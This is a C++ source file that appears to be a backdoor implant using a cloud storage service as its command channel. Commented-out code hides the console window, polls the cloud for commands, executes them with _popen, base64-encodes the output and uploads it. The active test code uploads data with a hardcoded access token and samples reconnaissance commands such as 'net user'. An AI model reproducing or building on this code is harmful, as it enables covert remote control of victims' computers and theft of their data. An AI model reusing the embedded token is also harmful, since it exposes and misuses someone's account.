#include <stdio.h>
#include <iostream>
#include <windows.h>
#include "MyString.h"
#include "CloudFunctions.h"
#include <stdio.h>

int Odd_Num() {
    int result = rand();
    if (result % 2 == 1)
        return result;
    else
        return result - 1;
}

//int main() {
//    //HWND h = GetConsoleWindow();
//    //ShowWindow(h, 0);
//    DWORD i = 2;
//    while (Odd_Num() % 2 != 0) {
//        Sleep(expo(i, 4) * 1000);
//        MyString data = downloadContext();
//        if (data.getLength() > 0) {
//            
//            i = 2;
//            for (int i = 0; i < data.getLength(); i++) {
//                if (data.getCharAt(i) == '\n') {
//                    data.setCharAt(i, '&');
//                }
//            }
//            FILE* file = _popen(data.getContext(), "r");
//            MyString output = "";
//            char temp_buffer[1024];
//            while (fgets(temp_buffer, sizeof(temp_buffer), file) != NULL) {
//                output = output + temp_buffer;
//            }
//            //output = encoder(output, 1);
//            output = converter_64(output);
//            upload(output);
//            deleteContext();
//        } else {
//            i++;
//        }
//    }
//    return 0;
//}

int main() {
    std::string input = "dir\nnet user\necho bs";
    std::string output;
    std::string refreshToken;
    std::string accessToken = "ya29.a0AcM612z22xQAG364D6qu6wA_3jTaYf6KsFJ975Ff0P5YC1V81xbDwXe5wH5cinumZ4gkTRJvmsQMUz4KvcxfX-upw4OD-L4IvOXRlPCUrU-mRfmljsypX1UjFz53kOd1qo9UfFtAoDNf5RsHbgeGY3MsISjPVllaTJcaCYlfngaCgYKASsSARASFQHGX2MiTDUNbP1sUbIvlDlLSlMB1g0177";
    output = "Start!";
    for (int i = 0; i < 10 * 1024; i++)
    {
        output += "a";
    }
    output += "End!";
    WORD errorCode;
    //errorCode = singlePartUpload(output, accessToken, 151, 27);
    //errorCode = downloadSourceContext(accessToken, output);
    //DWORD responseCode;
    /*setNewAccessToken(accessToken, refreshToken);*/
    //responseCode = setNewRefreshAndAccessToken(accessToken, refreshToken);
    //handleFailsafe(refreshToken, accessToken);
    //printf("Test begins:\nThe refresh token is: %s\nThe access token is: %s\nWith the response code: %d\n", refreshToken.c_str(), accessToken.c_str(), responseCode);
    //printf("Test begins:\nThe refresh token is: %s\nThe access token is: %s\n", refreshToken.c_str(), accessToken.c_str());
    //downloadContext(accessToken, output);
    //printf("Test begins:\nThe single upload error code: %d", errorCode);
    //printf_s("Source Context is: %s", output.c_str());
    //std::replace(input.begin(), input.end(), '\n', '&');
    
    //commandExecuter(input, output);
    //printf("Command execution result: %s", output.c_str());
    
    //errorCode = deleteSource(accessToken);
    //printf("Source deleted with code: %d", errorCode);
    errorCode = uploadResult(output, accessToken, 4);
    printf("Upload is done with code: %d\n", errorCode);

    return 0;
}

void main1() {
    FILE* file = _popen("dir&dir&dir&dir&dir&dir&dir&dir&dir", "r");
    char buffer[1024];
    while (fgets(buffer, 1024, file))
    {
        printf("%s", buffer);
    }

}